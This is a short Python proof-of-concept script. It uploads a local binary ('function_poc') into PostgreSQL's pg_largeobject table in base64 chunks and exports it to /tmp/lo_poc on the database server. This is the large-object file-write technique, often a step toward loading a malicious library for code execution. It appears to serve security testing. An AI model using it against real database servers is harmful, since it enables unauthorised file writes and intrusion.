from base64 import b64encode
from contextlib import closing
import psycopg2
from sys import argv

from util import create_database, drop_database, exec_psql


db_name = 'db'

if len(argv) == 1:
    create_database(db_name)

    exec_psql(["""SELECT lo_creat(0)"""], db=db_name)
else:
    loid = int(argv[1])

    with open('function_poc', 'rb') as fp:
        data = fp.read()

    chunk_size = 2048
    statements = []
    
    for idx, chunk in enumerate((data[i:i + chunk_size] for i in range(0, len(data), chunk_size))):
        b64 = b64encode(chunk)
        statements.append("""INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({}, {}, decode('{}', 'base64'))""".format(str(loid), str(idx), b64))
    
    statements.append("""SELECT lo_export({}, '/tmp/lo_poc')""".format(loid))

    statements.append("""SELECT lo_unlink({})""".format(loid))

    exec_psql(statements, db=db_name)

    drop_database(db_name)
